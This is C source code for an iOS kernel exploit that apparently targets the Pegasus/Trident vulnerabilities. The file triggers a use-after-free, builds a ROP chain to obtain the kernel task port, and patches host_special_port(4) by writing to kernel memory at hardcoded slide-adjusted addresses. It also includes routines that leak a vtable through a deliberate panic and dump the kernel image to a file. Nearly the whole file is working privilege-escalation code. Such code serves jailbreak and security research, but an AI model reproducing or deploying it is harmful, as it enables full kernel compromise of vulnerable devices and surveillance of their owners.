#include <errno.h>              // errno
#include <stddef.h>             // size_t
#include <stdio.h>              // FILE, fopen, fwrite, fclose
#include <string.h>             // strerror
#include <unistd.h>             // usleep

#include <mach/kern_return.h>   // kern_return_t, KERN_SUCCESS
#include <mach/mach_error.h>    // mach_error_string
#include <mach/mach_init.h>     // mach_task_self
#include <mach/mach_types.h>    // task_t
#include <mach/vm_map.h>        // vm_read_overwrite, vm_write
#include <mach/task.h>          // task_get_special_port
#include <mach/task_special_ports.h> // TASK_*

#include "common.h"             // DEBUG
#include "io.h"                 // OSString, kOSStringNoCopy
#include "rop.h"                // get_stack_pivot, rop_*
#include "slide.h"              // get_kernel_slide
#include "try.h"                // THROW
#include "uaf_read.h"           // uaf_get_bytes
#include "uaf_panic.h"          // uaf_panic_leak_vtab
#include "uaf_rop.h"            // uaf_rop, uaf_rop_stack

#include "exploit.h"

void panic_leak(void)
{
    uaf_panic_leak_vtab();

    THROW("Failed to panic the device. Are you sure your iOS version is vulnerable to Pegasus/Trident?");
}

void dump_kernel(const char *path)
{
    DEBUG("Dumping kernel to file");

    file_t kernel;
    uaf_dump_kernel(&kernel);
    FILE *f = fopen(path, "wb");
    if(f == NULL)
    {
        free(kernel.buf);
        THROW("Failed to open output file (%s)", strerror(errno));
    }
    fwrite(kernel.buf, 1, kernel.len, f);
    fclose(f);
    free(kernel.buf);

    DEBUG("Wrote output to %s", path);
}

//#include <mach/vm_map.h>
//#include <mach/host_priv.h>

void exploit(void)
{
    // Before we do anything else
    void **chain = uaf_rop_stack();

    // Dump kernel
    file_t kernel;
    //uaf_dump_kernel(&kernel);

    task_t kernel_task;
    void **head = chain;

    // Get kernel task port
    rop_get_kernel_task(&kernel, &head, &kernel_task);

    DEBUG("Rop chain: " ADDR "-" ADDR, (addr_t)chain, (addr_t)head);
    for(void **frame = chain; 1; frame = frame[0])
    {
        DEBUG("fp: " ADDR, (addr_t)frame[0]);
        DEBUG("lr: " ADDR, (addr_t)frame[1]);
        if(!(frame[0] >= (void*)chain && frame[0] < (void*)head))
        {
            break;
        }
        for(void **reg = &frame[2]; (void*)reg < frame[0]; ++reg)
        {
            DEBUG("    " ADDR, (addr_t)*reg);
        }
#ifdef __LP64__
        DEBUG("----------------------");
#else
        DEBUG("--------------");
#endif
    }
    usleep(100);

    TRY
    ({
        uaf_rop(&kernel);
    })
    CATCH(e,
    {
        DEBUG("TODO: fix ROP to return 0");
    })

    if(!MACH_PORT_VALID(kernel_task))
    {
        THROW("Failed to get kernel task (%x)", kernel_task);
    }
    DEBUG("Got kernel task");

    DEBUG("Installing host_special_port(4) patch...");
    usleep(100);
    vm_address_t kernel_task_addr,
                 kernel_self_port_addr;
    vm_size_t size = sizeof(kernel_task_addr);
    vm_read_overwrite(kernel_task, (vm_address_t)(0xffffff8004536010 + get_kernel_slide()), sizeof(kernel_task_addr), (vm_address_t)&kernel_task_addr, &size);
    DEBUG("Kernel task address: " ADDR, (addr_t)kernel_task_addr);
    usleep(100);
    size = sizeof(kernel_self_port_addr);
    vm_read_overwrite(kernel_task, kernel_task_addr + 0xe8, sizeof(kernel_self_port_addr), (vm_address_t)&kernel_self_port_addr, &size);
    DEBUG("Kernel port address: " ADDR, (addr_t)kernel_self_port_addr);
    usleep(100);
    void **special = (void**)(0xffffff80045946c0 + get_kernel_slide());
    vm_write(kernel_task, (vm_address_t)(&special[4]), (vm_address_t)&kernel_self_port_addr, sizeof(kernel_self_port_addr));
    /*uint64_t buf[0x20];
    size = sizeof(buf);
    vm_read_overwrite(kernel_task, (vm_address_t)special, sizeof(buf), (vm_address_t)buf, &size);
    PRINT_BUF("realhost.special", buf, sizeof(buf));*/

    /*{
        vm_region_submap_info_data_64_t info;
        vm_size_t size;
        mach_msg_type_number_t info_count = VM_REGION_SUBMAP_INFO_COUNT_64;
        unsigned int depth = 0;
        vm_address_t addr = 0;
        size_t displaysize;
        char scale;
        char curR, curW, curX, maxR, maxW, maxX;

        while (1)
        {
            // get next memory region
            if(vm_region_recurse_64(kernel_task, &addr, &size, &depth, (vm_region_info_t)&info, &info_count) != KERN_SUCCESS)
            {
                break;
            }

            // size
            scale = 'K';
            displaysize = size / 1024;
            if(displaysize > 99999)
            {
                scale = 'M';
                displaysize /= 1024;
            }

            // protection
            curR = (info.protection) & VM_PROT_READ ? 'r' : '-';
            curW = (info.protection) & VM_PROT_WRITE ? 'w' : '-';
            curX = (info.protection) & VM_PROT_EXECUTE ? 'x' : '-';
            maxR = (info.max_protection) & VM_PROT_READ ? 'r' : '-';
            maxW = (info.max_protection) & VM_PROT_WRITE ? 'w' : '-';
            maxX = (info.max_protection) & VM_PROT_EXECUTE ? 'x' : '-';

            printf(ADDR "-" ADDR " [%5zu%c] %c%c%c/%c%c%c\n",
                   addr, addr+size, displaysize, scale,
                   curR, curW, curX, maxR, maxW, maxX);

            addr += size;
        }
    }*/
}
